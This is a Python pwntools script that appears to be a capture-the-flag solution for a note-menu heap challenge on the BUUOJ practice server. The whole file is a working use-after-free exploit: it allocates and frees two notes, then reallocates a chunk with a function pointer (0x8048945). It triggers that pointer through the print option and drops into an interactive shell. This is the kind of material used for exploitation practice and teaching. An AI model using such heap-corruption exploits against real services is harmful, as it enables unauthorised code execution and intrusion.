from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25067)

def add(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Note size :', str(size).encode())
	io.sendlineafter(b'Content :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())

def printc(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())

add(0x18, b'colin')
add(0x18, b'colin')
delete(0)
delete(1)
add(0x8, p32(0x8048945) + p32(0))
printc(0)
io.interactive()
